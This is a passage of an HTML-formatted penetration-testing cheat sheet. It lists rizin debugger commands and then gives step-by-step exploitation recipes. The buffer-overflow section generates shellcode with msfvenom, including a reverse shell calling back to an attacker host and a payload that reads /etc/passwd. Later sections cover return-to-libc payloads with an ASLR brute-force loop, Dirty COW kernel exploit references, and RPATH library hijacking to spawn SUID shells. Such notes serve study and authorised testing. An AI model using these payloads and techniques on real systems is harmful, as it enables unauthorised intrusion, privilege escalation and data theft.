<span class="nv">afv</span><span class="o">=</span>          <span class="c"># Funcs vars/args drefs</span>
afvf          <span class="c"># Show rel stackframe var</span>
afbr          <span class="c"># Func exit instr addrs</span>

<span class="c"># Rename</span>
afvn &lt;name&gt; <span class="o">[</span>&lt;old&gt;]   <span class="c"># Func arg/var</span>
afvr &lt;reg&gt; &lt;name&gt; <span class="o">[</span>t] <span class="c"># Reg local arg</span>
afvs &lt;del&gt; &lt;name&gt; <span class="o">[</span>t] <span class="c"># Stack local arg</span>
afvb &lt;del&gt; &lt;name&gt; <span class="o">[</span>t] <span class="c"># B-ptr local arg</span>

<span class="c"># Show function parameters as arg[&lt;n&gt;]</span>
e dbg.funcarg<span class="o">=</span><span class="nb">true</span>

<span class="c"># Memory maps</span>
iSq     <span class="c"># Sections - iS= is prettier</span>
iSS     <span class="c"># Mem segments</span>
om      <span class="c"># om= is prettier - def IO map</span>
im      <span class="c"># Predefined memory</span>
dm      <span class="c"># List current pid mem map</span>
dmm     <span class="c"># List modules/libraries in mem</span>
dmh     <span class="c"># Show heap map</span>
dmhg    <span class="c"># Show head graph</span>
dmha    <span class="c"># Show all malloc state info</span>
dmhbg   <span class="c"># Doubly-linked-list heap graph</span>
dmi &lt;lib/addr&gt; <span class="o">[</span>&lt;sym&gt;]  <span class="c"># Lib symbols</span>
dmia &lt;lib/addr&gt;         <span class="c"># All lib info</span>

<span class="c"># Run command on search hit</span>
e cmd.hit<span class="o">=</span>&lt;cmd&gt;

<span class="c"># Limit search results to 1</span>
e search.maxhits<span class="o">=</span>1

<span class="c"># Define memory location to search</span>
e search.in<span class="o">=</span>dbg.maps

<span class="c"># Gadget search (hex) in address range</span>
/a jmp esp @<span class="o">(</span> &lt;addr-ini&gt; &lt;addr-end&gt; <span class="o">)</span>

<span class="c"># Or set default search ranges</span>
e search.from<span class="o">=</span>&lt;addr&gt;
e search.to<span class="o">=</span>&lt;addr&gt;

<span class="c"># Fine-tune to mem types</span>
e search.in<span class="o">=</span>dbg.maps.rx

<span class="c"># Seek to the first search hit</span>
s/

<span class="c"># Flagspace</span>
fs search  <span class="c"># Select search flag space</span>
f ~<span class="o">{</span>:...   <span class="c"># All flags in space - HUD</span>
fs <span class="k">*</span>       <span class="c"># Select all flag spaces</span>
fN         <span class="c"># Name of tag at point</span>
ff <span class="o">[</span>glob]  <span class="c"># Bytes to next/match flag</span>
f+&lt;name&gt; &lt;v&gt; <span class="c"># Create/set flag value</span>
fz[-][name]    <span class="c"># Show/New/Del flag zone</span>
ft[-][tag] <span class="o">[</span>val] <span class="c"># Show/New/Del tags</span>

<span class="c"># Interactive option-setter view</span>
Veq  <span class="c"># Press _ for HUD mode fast-set</span>

<span class="c"># Find the meaning of an option in HUD</span>
ell ~<span class="o">{</span>:...  <span class="c"># {: -&gt; Pretty format</span>
<span class="c"># Remove {: to hide unaligned options</span>
<span class="c"># Not possible to set values like this</span>

<span class="c"># Follow forked children</span>
e dbg.follow.child<span class="o">=</span><span class="nb">true</span>

<span class="c"># Stop execution when forked child ends</span>
e dbg.forks<span class="o">=</span><span class="nb">true</span>

<span class="c"># Interrupt all threads if rizin stops</span>
e dbg.threads<span class="o">=</span><span class="nb">true</span>

<span class="c"># Trace program and in a given range</span>
e dbg.trace<span class="o">=</span><span class="nb">true
</span>e dbg.trace.inrange<span class="o">=</span><span class="nb">true
</span>dtc &lt;from&gt; &lt;to&gt;

<span class="c"># Don't interrupt before syscalls</span>
e dbg.aftersyscall<span class="o">=</span><span class="nb">false</span>

<span class="c"># Run command when a syscall is hit</span>
e cmd.onsyscall<span class="o">=</span>&lt;cmd&gt;

<span class="c"># Disable ASLR (may require sudo)</span>
e io.aslr<span class="o">=</span><span class="nb">true</span>

<span class="c"># Change endianness and architecture</span>
e! cfg.bigendian   <span class="c"># e! Toggles boolean</span>
e asm.arch<span class="o">=</span>&lt;<span class="nb">arch</span><span class="o">&gt;</span>

<span class="c"># Changes will only be done in memory</span>
e io.cache<span class="o">=</span><span class="nb">true
</span>e io.pcache<span class="o">=</span><span class="nb">true</span>

<span class="c"># Show all sub-configurations of key:</span>
es io  <span class="c"># Display cache, pcache, aslr..</span>

<span class="c"># Override memory with two Intel NOPs</span>
wx 9090 @&lt;location&gt;  <span class="c"># wxs - seek after</span>

<span class="c"># Convert...</span>
?x &lt;str&gt;   <span class="c"># String to hexpairs</span>
?x- &lt;hexp&gt; <span class="c"># Hexpair to string</span>
?vi &lt;<span class="nb">expr</span><span class="o">&gt;</span> <span class="c"># Expression to decimal</span>
?<span class="o">=</span> &lt;<span class="nb">expr</span><span class="o">&gt;</span>  <span class="c"># Expression to hex and dec</span>
?X &lt;<span class="nb">expr</span><span class="o">&gt;</span>  <span class="c"># Expression to hex</span>
?v &lt;<span class="nb">expr</span><span class="o">&gt;</span>  <span class="c"># Expression to 0x+hex</span>
?x+ &lt;<span class="nb">expr</span><span class="o">&gt;</span> <span class="c"># ?v honoring endianness</span>
?o &lt;<span class="nb">expr</span><span class="o">&gt;</span>  <span class="c"># Expression to octal</span>
?b &lt;<span class="nb">expr</span><span class="o">&gt;</span>  <span class="c"># Expression to binary</span>
? &lt;<span class="nb">expr</span><span class="o">&gt;</span>   <span class="c"># Expression to multi-format</span>
?u &lt;num&gt;   <span class="c"># Number to human units</span>
?p &lt;vaddr&gt;   <span class="c"># Virtual to Physical addr</span>
?P &lt;paddr&gt;   <span class="c"># Physical to Virtual addr</span>
?b64[-] &lt;str&gt; <span class="c"># String from/to base 64</span>

<span class="c"># Generate...</span>
?s &lt;f&gt; &lt;t&gt; &lt;s&gt; <span class="c"># Sequence: from-to-step</span>
?r &lt;f&gt; &lt;t&gt;     <span class="c"># Random number in range</span>

<span class="c"># Show...</span>
?h &lt;str&gt;  <span class="c"># String hash</span>
?l &lt;str&gt;  <span class="c"># String length</span>
?a        <span class="c"># ASCII table</span>

<span class="c"># Visual/Panels view</span>
V    <span class="c"># Visual view (from prompt)</span>
v    <span class="c"># Panels view (from prompt)</span>
V    <span class="c"># Graph view (from visual/panels)</span>
SPC  <span class="c"># Switch to Graph/Panels view</span>
<span class="o">!</span>    <span class="c"># Switch to Visual/Panels view</span>
p/n  <span class="c"># Previous/Next mode</span>
_    <span class="c"># HUD view</span>
<span class="se">\ </span>   <span class="c"># User-friendly view</span>
d1   <span class="c"># Bit editor (from visual/panels)</span>
m    <span class="c"># Un/Select menu</span>
c    <span class="c"># Enable/disable cursor</span>
b    <span class="c"># Toggle breakpoint at cursor</span>
g    <span class="c"># Seek to offset</span>
/    <span class="c"># Highlight</span>
G    <span class="c"># Seek to highlight</span>
n/N  <span class="c"># Seek to next/prev func/flag/hit</span>
1-9  <span class="c"># Follow jmp/call shortcut id</span>
u/U  <span class="c"># Undo/Redo seek</span>
x    <span class="c"># Show x/refs from/to data/code</span>
r    <span class="c"># Toggle call/jmp/lea hints</span>
s/S  <span class="c"># Step in/over (debug)</span>
:dc  <span class="c"># Debug continue</span>
i    <span class="c"># Insert hex</span>
&amp;    <span class="c"># Toggle cache</span></code></pre></div></div> <h3 id="buffer-overflow--rizin--control-instr-ptr-program-counter"> <a href="#buffer-overflow--rizin--control-instr-ptr-program-counter" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--control-instr-ptr-program-counter"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Control Instr-Ptr/Program-Counter </h3> <ul> <li>Execute after: <code>rizin &lt;binary/pid&gt;</code><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reopen (debug) with De Bruijn input</span>
ood <span class="si">$(</span>?x- <span class="si">$(</span>wopD<span class="k">*</span> &lt;len&gt; ~[1]<span class="si">))</span><span class="p">;</span> dc

<span class="c"># Find De Bruijn offset at point (IP)</span>
wopO <span class="sb">`</span>s<span class="sb">`</span>
<span class="c"># Explicit EIP reg: wopO `dr eip`</span>

<span class="c"># Reopen (debug) to check the offset</span>
ood <span class="s2">"</span><span class="si">$(</span>?x- <span class="si">$(</span>wopD<span class="k">*</span> &lt;offset&gt; ~[1]<span class="si">))</span><span class="s2">TEST"</span><span class="p">;</span> dc<span class="p">;</span> ?x- 0x<span class="si">$(</span>?x+ <span class="si">$(</span>dr PC<span class="si">))</span>
<span class="c"># TEST should appear; if TSET, try:</span>
e cfg.bigendian<span class="o">=</span>1 <span class="c"># Change endianness</span>
e asm.arch<span class="o">=</span>&lt;<span class="nb">arch</span><span class="o">&gt;</span> <span class="c"># See: e asm.arch=?</span></code></pre></div></div></li> <li>Or use <code>rz-gg</code> for IP/PC control:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate De Bruijn string pattern</span>
rz-gg <span class="nt">-P</span> &lt;len&gt; <span class="nt">-r</span>  <span class="c"># Hex: remove -r</span>

<span class="c"># Identify offset at address:</span>
rz-gg <span class="nt">-q</span> 0x&lt;addr&gt;
<span class="c"># Example:</span>
rz-gg <span class="nt">-q</span> 0x<span class="si">$(</span>rz-gg <span class="nt">-P</span> 100 | <span class="nb">tail</span> <span class="nt">-c-9</span><span class="si">)</span>
<span class="c"># Output: 96 |though wrong endianness</span></code></pre></div></div></li> </ul> <h3 id="buffer-overflow--rizin--locate-jump---gadget-address"> <a href="#buffer-overflow--rizin--locate-jump---gadget-address" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--locate-jump---gadget-address"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Locate Jump / Gadget Address </h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set memory search location</span>
e search.in<span class="o">=</span>dbg.maps

<span class="c"># Limit search results to 1</span>
e search.maxhits<span class="o">=</span>1

<span class="c"># Assemble and search by opcode</span>
/a jmp esp @<span class="o">(</span> <span class="sb">`</span>dmm ~&lt;bin&gt;[0,1]<span class="sb">`</span> <span class="o">)</span>

<span class="c"># Get address respecting endianness</span>
?x+ hit0_0

<span class="c"># Find the De Bruijn offset until SP</span>
wopO 0x<span class="sb">`</span>px0 4 @r:SP<span class="sb">`</span>

<span class="c"># Seek to first hit if necessary</span>
s/</code></pre></div></div> <h3 id="buffer-overflow--rizin--memory-execution"> <a href="#buffer-overflow--rizin--memory-execution" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--memory-execution"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Memory Execution </h3> <ul> <li>Only possible if DEP/NX is disabled</li> <li>Send, in the input string, the payload <code>&lt;IP-offset&gt;&lt;SP-JMP&gt;&lt;SP-offset&gt;&lt;shcode&gt;</code></li> <li>Limit the shellcode to buffer sizes:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Make a simple exec first</span>
msfvenom <span class="nt">-p</span> linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">'whoami'</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">&lt;bchar1&gt;</span><span class="se">\x</span><span class="s2">&lt;bchar2&gt;"</span>
<span class="c"># rz-gg also has an exec shellcode</span>
<span class="c"># If only exec works, use a bash wrap</span>
<span class="c"># CMD='bash -c \"&lt;cmd&gt;\"', and base64</span>
<span class="c"># (without -w 0) for file transfers</span>

<span class="c"># Fallback to try reading a file</span>
msfvenom <span class="nt">-p</span> linux/x86/read_file <span class="nv">PATH</span><span class="o">=</span>/etc/passwd <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">&lt;bchar1&gt;</span><span class="se">\x</span><span class="s2">&lt;bchar2&gt;"</span>
<span class="c"># Write hex payload to file with pipe</span>
<span class="c"># | sed -n 's/";\?//gp' | tr -d '\n'</span>
<span class="c"># To use as: &lt;bin&gt; $(printf $(cat p))</span>

<span class="c"># Move to a reverse shell if it works</span>
msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;lip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;lport&gt; <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">&lt;bchars&gt;"</span>
<span class="c"># Use the staged payload version if</span>
<span class="c"># the size surpasses the buffer limit</span>
linux/x86/shell/reverse_tcp
<span class="c"># Try bind shell if it doesn't work</span>

<span class="c"># Fallback to socket-reuse payloads</span>
searchsploit <span class="nt">-x</span> 34060  <span class="c"># Or 47530</span>
<span class="c"># Maybe MS linux/x86/shell_find_port?</span>

<span class="c"># Encode custom payloads bchars:</span>
msfvenom <span class="nt">-p</span> generic/custom <span class="nv">PAYLOADSTR</span><span class="o">=</span><span class="s2">"&lt;payload&gt;"</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">&lt;bchars&gt;"</span>
<span class="c"># Or from file PAYLOADFILE=&lt;file&gt;</span></code></pre></div></div></li> <li>Socket-reuse <a href="https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/">tutorial</a></li> </ul> <h3 id="buffer-overflow--rizin--return-to-libc"> <a href="#buffer-overflow--rizin--return-to-libc" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--return-to-libc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Return to libc </h3> <ul> <li>Only feasible if PIE is disabled</li> <li>Locate libc address:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Interpreter should be: ld-linux.so</span>
readelf <span class="nt">-l</span> &lt;file&gt; | <span class="nb">grep </span>interpreter
<span class="c"># man ldd -&gt; search for Security</span>

<span class="c"># Find the address</span>
ldd &lt;file&gt; | <span class="nb">grep </span>libc

<span class="c"># Perform relocations &amp; check missing</span>
ldd <span class="nt">-r</span> &lt;file&gt; | <span class="nb">grep </span>libc</code></pre></div></div></li> <li>If ASLR is enabled, run <code>ldd</code> many times and note the number of altered bytes:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># zsh - all possibilities for 3 bytes</span>
<span class="nb">echo</span> <span class="nv">$[</span> 8 <span class="k">**</span> 3 <span class="o">]</span>
<span class="c"># 512 -&gt; 511 possibilities to fail</span>

<span class="c"># zsh - guesses to succeed worst case</span>
<span class="nb">echo</span> <span class="nv">$[</span> 1 - <span class="o">(</span>511.0/512<span class="o">)</span> <span class="k">**</span> 3000 <span class="o">]</span></code></pre></div></div></li> <li>Get the offsets of <code>system</code>, <code>exit</code> and <code>sh</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># system and exit</span>
readelf <span class="nt">-s</span> &lt;libc.so.6&gt; | <span class="nb">grep</span> <span class="s2">" system@</span><span class="se">\|</span><span class="s2"> exit@"</span>

<span class="c"># /bin/sh</span>
strings <span class="nt">-a</span> <span class="nt">-t</span> x &lt;libc.so.6&gt; | <span class="nb">grep</span> <span class="s2">"/bin/"</span>
<span class="c"># /bin/sh is just a string, you can</span>
<span class="c"># even provide it as input to the bin</span></code></pre></div></div></li> <li>Assemble the libc functions in rizin:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ?x+ outputs honoring the endianness</span>
?x+ &lt;libc-base&gt; + &lt;func-offset&gt; | <span class="nb">sed</span> <span class="s1">'s/../\\x&amp;/g'</span>
<span class="c"># &lt;func-offset&gt;: system or exit or sh</span>
<span class="c"># Use any libc base if enabled ASLR</span></code></pre></div></div></li> <li>Check for badchars</li> <li>TODO Find how to encode+decode <code>system</code>, <code>exit</code> and/or <code>sh</code> using <code>rz-gg</code></li> <li>Overflow:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># bash/zsh - their printf convert hex</span>
&lt;file&gt; <span class="s2">"</span><span class="si">$(</span><span class="nb">printf</span> <span class="s2">"%&lt;offset-to-ip&gt;s&lt;hex-system-exit-sh&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="si">)</span><span class="s2">"</span>
<span class="c"># ^Uses space padding, alter if bchar</span>

<span class="c"># If bash/zsh are not available</span>
&lt;file&gt; <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x&lt;offset-to-ip&gt;,"&lt;hex-system-exit-sh&gt;","\n"'</span><span class="si">)</span><span class="s2">"</span>
<span class="c"># perl is an openssl dependency</span>

<span class="c"># If print doesn't accept \x use:</span>
&lt;file&gt; <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x&lt;offset-to-ip&gt;,(pack "H*","&lt;hex-system-exit-sh-no-\x&gt;"),"\n"'</span><span class="si">)</span><span class="s2">"</span>
<span class="c"># pack expects hex like: 434241 (CBA)</span>

<span class="c"># bash/zsh - ASLR enabled bruteforce</span>
<span class="nv">i</span><span class="o">=</span>0<span class="p">;</span> <span class="nv">pay</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">printf</span> <span class="s2">"%&lt;offset-to-ip&gt;s&lt;hex-system-exit-sh&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="k">until</span> &lt;file&gt; <span class="s2">"</span><span class="nv">$pay</span><span class="s2">"</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">33[1A</span><span class="se">\0</span><span class="s2">33[2KTry </span><span class="k">$((</span><span class="o">++</span>i<span class="k">))</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
<span class="c"># TODO - Find a way for parallelizing</span></code></pre></div></div></li> </ul> <h3 id="buffer-overflow--rizin--return-to-plt"> <a href="#buffer-overflow--rizin--return-to-plt" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--return-to-plt"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Return to PLT </h3> <ul> <li>Requires that <code>system</code> is used in the binary</li> <li>It is similar to return to libc - <a href="https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html">See</a></li> <li>The only difference is that one needs to find the address of <code>system</code> in the binary address, which is the same on each execution (check the PLT with <code>rz</code>)</li> <li>Maybe the location in the PLT?<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-R</span> &lt;file&gt; | <span class="nb">grep</span> <span class="nt">-i</span> libc</code></pre></div></div></li> </ul> <h3 id="buffer-overflow--rizin--more-advanced-techniques"> <a href="#buffer-overflow--rizin--more-advanced-techniques" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--more-advanced-techniques"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> More Advanced Techniques </h3> <ul> <li><a href="https://www.ret2rop.com/2018/08/make-stack-executable-again.html">Making the stack writable again</a></li> <li><a href="https://www.ret2rop.com/2018/10/format-strings-got-overwrite-remote.html">Override GOT Table</a></li> <li><a href="https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html">Leaking unknown libc</a></li> <li><a href="https://www.ret2rop.com/2020/05/canary-pie-byte-bruteforce.html">Canary, NX and PIE bypass - ROP</a></li> <li>Others: <a href="https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/">1</a> | Bypassing ASLR: <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/">1</a>, <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/">2</a>, <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/">3</a></li> </ul> <h1 id="binaries"> <a href="#binaries" class="anchor-heading" aria-labelledby="binaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Binaries </h1> <h2 id="binaries--reading"> <a href="#binaries--reading" class="anchor-heading" aria-labelledby="binaries--reading"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Reading </h2> <h3 id="binaries--reading--grep"> <a href="#binaries--reading--grep" class="anchor-heading" aria-labelledby="binaries--reading--grep"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> grep </h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Look for a string related to a search</span>
<span class="nb">grep</span> <span class="nt">--binary-files</span><span class="o">=</span>text <span class="nt">--context</span><span class="o">=</span>100 <span class="s1">'&lt;search&gt;'</span> &lt;bin&gt;
<span class="c"># -a -&gt; --binary-files=text</span>
<span class="c"># --context/-C - Show &lt;n&gt; lines bef/aft</span></code></pre></div></div> <h3 id="binaries--reading--strings"> <a href="#binaries--reading--strings" class="anchor-heading" aria-labelledby="binaries--reading--strings"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> strings </h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Show all strings in binary</span>
strings &lt;bin&gt;</code></pre></div></div> <h2 id="binaries--tracing"> <a href="#binaries--tracing" class="anchor-heading" aria-labelledby="binaries--tracing"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tracing </h2> <h3 id="binaries--tracing--strace"> <a href="#binaries--tracing--strace" class="anchor-heading" aria-labelledby="binaries--tracing--strace"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> strace </h3> <ul> <li>Trace system calls:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace &lt;bin&gt;</code></pre></div></div></li> </ul> <h3 id="binaries--tracing--ltrace"> <a href="#binaries--tracing--ltrace" class="anchor-heading" aria-labelledby="binaries--tracing--ltrace"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ltrace </h3> <ul> <li>Trace libraries and system calls:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ltrace &lt;bin&gt;
<span class="c"># Use -S for output similar to strace</span></code></pre></div></div></li> </ul> <h1 id="linux"> <a href="#linux" class="anchor-heading" aria-labelledby="linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h1> <h2 id="linux--kernel-exploits"> <a href="#linux--kernel-exploits" class="anchor-heading" aria-labelledby="linux--kernel-exploits"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Kernel Exploits </h2> <h3 id="linux--kernel-exploits--dirty-cow---cve-2016-5195"> <a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195" class="anchor-heading" aria-labelledby="linux--kernel-exploits--dirty-cow---cve-2016-5195"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dirty COW - CVE-2016-5195 </h3> <h4 id="linux--kernel-exploits--dirty-cow---cve-2016-5195--kernels-affected"> <a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--kernels-affected" class="anchor-heading" aria-labelledby="linux--kernel-exploits--dirty-cow---cve-2016-5195--kernels-affected"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Kernels Affected </h4> <ul> <li><a href="https://en.wikipedia.org/wiki/Dirty_COW">Reference</a></li> <li>Range: 2.6.22 &lt; 4.8.3, 4.7.9, 4.4.26</li> </ul> <h4 id="linux--kernel-exploits--dirty-cow---cve-2016-5195--effect"> <a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--effect" class="anchor-heading" aria-labelledby="linux--kernel-exploits--dirty-cow---cve-2016-5195--effect"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Effect </h4> <ul> <li>Modify files with root privileges</li> <li>From adding root users to create SUID files (by modifying existing)</li> </ul> <h4 id="linux--kernel-exploits--dirty-cow---cve-2016-5195--patched-old-kernels"> <a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--patched-old-kernels" class="anchor-heading" aria-labelledby="linux--kernel-exploits--dirty-cow---cve-2016-5195--patched-old-kernels"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Patched Old Kernels </h4> <div class="table-wrapper"><table> <tr><th>Kernel</th><th>Distro</th></tr> <tr><td>3.2.0-113.155</td><td>Ubuntu 12.04 LTS</td></tr> <tr><td>3.13.0-100.147</td><td>Ubuntu 14.04 LTS</td></tr> <tr><td>3.16.36-1+deb8u2</td><td>Debian 8</td></tr> <tr><td>4.4.0-45.66</td><td>Ubuntu 16.04 LTS</td></tr> <tr><td>4.8.0-26.28</td><td>Ubuntu 16.10</td></tr> <tr><td>3.10.0-327.36.3</td><td>RHEL 7, CentOS 7</td></tr> <tr><td>2.6.32-642.6.2</td><td>RHEL 6, CentOS 6</td></tr> <tr><td>2.6.18-416</td><td>RHEL 5, CentOS 5</td></tr> <tr><td>3.0.101-84.1</td><td>SLES 11 SP4</td></tr> <tr><td>3.12.60-52.57.1</td><td>SLES 12 GA LTSS</td></tr> <tr><td>3.12.62-60.64.8.2</td><td>SLES 12 SP1</td></tr> </table></div> <h4 id="linux--kernel-exploits--dirty-cow---cve-2016-5195--working-exploits"> <a href="#linux--kernel-exploits--dirty-cow---cve-2016-5195--working-exploits" class="anchor-heading" aria-labelledby="linux--kernel-exploits--dirty-cow---cve-2016-5195--working-exploits"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Working Exploits </h4> <ul> <li>2.6.24-16 - EID 40839 (add root user) <ul> <li>Check the exploit for the gcc flags</li> <li><a href="https://github.com/dirtycow/dirtycow.github.io/issues/25#issuecomment-255852675">Make the exploit stable</a></li> </ul> </li> <li><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">List of PoC</a></li> </ul> <h2 id="linux--elf-vulnerabilities"> <a href="#linux--elf-vulnerabilities" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ELF Vulnerabilities </h2> <h3 id="linux--elf-vulnerabilities--identification"> <a href="#linux--elf-vulnerabilities--identification" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--identification"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identification </h3> <ul> <li>Identify with <a href="https://github.com/slimm609/checksec.sh">checksec</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="nt">-type</span> f <span class="nt">-exec</span> /tmp/checksec <span class="nt">--file</span><span class="o">={}</span> <span class="se">\;</span> 2&gt;/dev/null | less <span class="nt">-R</span> <span class="nt">-S</span>
<span class="c"># Use --listfile=&lt;file&gt; instead</span>
<span class="c"># --proc=&lt;pid&gt; and --proc-libs=&lt;pid&gt;</span>
<span class="c"># to analyze a running process or</span>
<span class="c"># --proc-all for all processes</span></code></pre></div></div></li> </ul> <h3 id="linux--elf-vulnerabilities--rpath"> <a href="#linux--elf-vulnerabilities--rpath" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--rpath"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RPATH </h3> <ul> <li>The ELFs shall have RW-RPATH</li> <li>Identify the RPATH and the name of the libraries:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf <span class="nt">-d</span> /usr/bin/sudo | <span class="nb">grep</span> <span class="s2">"NEEDED</span><span class="se">\|</span><span class="s2">RPATH"</span>

<span class="c"># Or</span>
strace /usr/bin/sudo 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"open</span><span class="se">\|</span><span class="s2">access</span><span class="se">\|</span><span class="s2">no such file"</span></code></pre></div></div></li> <li>Check if the directory or existing-libraries are writable</li> <li>Replace them (or create a new one) that spawns a shell with SUID</li> </ul> <h3 id="linux--elf-vulnerabilities--runpath"> <a href="#linux--elf-vulnerabilities--runpath" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--runpath"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RUNPATH </h3> <ul> <li>The ELFs shall have RUNPATH</li> <li>TODO regarding how to search it (try <code>readelf -d</code>)</li> <li>Libraries under RUNPATH are searched after <code>LD_LIBRARY_PATH</code>, so this may allow the <code>LD_PRELOAD</code> trick to work</li> </ul> <h3 id="linux--elf-vulnerabilities--stack-clash---cve2017-1000379"> <a href="#linux--elf-vulnerabilities--stack-clash---cve2017-1000379" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--stack-clash---cve2017-1000379"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Stack Clash - CVE2017-1000379 </h3> <ul> <li>The ELFs shall have PIC (use <code>checksec</code>)</li> <li>The target ELFs shall be owned by root and have the SUID bit</li> <li>Follow the <a href="https://www.exploit-db.com/exploits/42275">instructions</a> for compiling</li> <li>Run the exploit:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># It may "die" with some binaries</span>
